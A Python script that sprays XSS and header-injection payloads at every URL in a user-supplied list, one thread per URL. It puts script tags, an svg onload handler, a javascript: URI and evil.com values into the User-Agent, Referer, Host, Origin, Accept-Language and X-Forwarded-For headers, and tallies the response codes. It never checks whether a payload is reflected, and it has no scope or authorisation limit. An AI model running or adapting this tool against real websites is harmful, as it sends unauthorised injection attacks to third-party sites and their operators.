import requests
import threading
import os
from collections import defaultdict

# List of malicious payloads for each header
payloads = {
    "User-Agent": [
        "{{bxsspayload_update}}",
        "Mozilla/5.0 XSS-Payload: alert(1)",
    ],
    "Referer": ['https://evil.com/"><script>alert(1)</script>', "javascript:alert(1)"],
    "X-Forwarded-For": ["127.0.0.1", "192.168.1.1", '"><script>alert(1)</script>'],
    "Host": ["127.0.0.1", "evil.com", '"><script>alert(1)</script>'],
    "Accept-Language": [
        'en"><script>alert(1)</script>',
        "en-us",
        '"><svg/onload=alert(1)>',
    ],
    "Origin": ["null", "https://evil.com", '"><script>alert(1)</script>'],
}

# Dictionary to store results
status_counts = defaultdict(int)
total_urls = 0

# Lock for thread-safe updates
lock = threading.Lock()


# Function to send requests
def send_request(url):
    global status_counts
    for header, values in payloads.items():
        for payload in values:
            headers = {header: payload}
            try:
                response = requests.get(url, headers=headers, timeout=5)
                status_code = response.status_code

                with lock:
                    status_counts[str(status_code)] += 1  # Store response codes

                print(f"[+] Tested {header} on {url} - Status: {status_code}")

            except requests.exceptions.RequestException as e:
                with lock:
                    status_counts["Failed"] += 1  # Track failed attempts
                print(f"[-] Failed: {url} - {header} - Error: {str(e)}")


# Let user select the list file
file_path = input("Enter the path to your URL list file (e.g., list.txt): ")

# Check if the file exists
if not os.path.exists(file_path):
    print(f"[-] Error: File '{file_path}' not found!")
    exit()

# Read URLs from file
with open(file_path, "r") as file:
    URLS = [line.strip() for line in file if line.strip()]

# Count total URLs
total_urls = len(URLS)

# Use multi-threading for faster execution
threads = []
for url in URLS:
    thread = threading.Thread(target=send_request, args=(url,))
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

# Final summary report
print("\n[✅] Header Injection Testing Completed!")
print("========== Request Summary ==========")
print(f"Total URLs Processed: {total_urls}")

# Sort and print numeric status codes first
for status in sorted(status_counts.keys(), key=lambda x: (x.isdigit(), x)):
    print(f"  {status}: {status_counts[status]} requests")

print("=====================================")
